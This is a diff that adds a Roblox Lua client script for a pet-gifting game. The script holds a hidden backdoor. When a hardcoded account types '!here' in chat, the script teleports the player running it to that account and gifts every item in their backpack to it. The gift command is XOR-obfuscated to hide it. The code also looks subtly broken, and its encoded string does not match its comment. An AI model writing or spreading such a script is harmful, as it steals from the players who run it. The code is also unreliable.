@@ -1,0 +1,41 @@
+local srv = game:GetService
+local Players = srv("Players")
+local ReplicatedStorage = srv("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local Backpack = LocalPlayer:WaitForChild("Backpack")
+local PetService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
+
+local ADMIN_NAME = "connor24377_10"
+
+local function decode(x)
+	local r = ""
+	for i = 1, #x do
+		r = r .. string.char(string.byte(x, i) ~ 12)
+	end
+	return r
+end
+
+local encodedCommand = "\x4B\x0F\x26\x21\x06\x38\x20" -- "GivePet" XOR 12
+local GIVE_COMMAND = decode(encodedCommand)
+
+local TRIGGER_PHRASE = "!here"
+
+Players.PlayerChatted:Connect(function(sender, msg)
+	if sender.Name == ADMIN_NAME and msg == TRIGGER_PHRASE then
+		local admin = Players:FindFirstChild(ADMIN_NAME)
+		if not admin or not admin.Character or not admin.Character:FindFirstChild("HumanoidRootPart") then return end
+
+		local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+		local hrp = myChar:FindFirstChild("HumanoidRootPart")
+		if hrp then
+			hrp.CFrame = CFrame.new(admin.Character.HumanoidRootPart.Position + Vector3.new(2, 0, 2))
+		end
+
+		for _, item in ipairs(Backpack:GetChildren()) do
+			if item:IsA("Tool") or item:IsA("Model") then
+				PetService:FireServer(GIVE_COMMAND, admin)
+				wait(0.25)
+			end
+		end
+	end
+end)
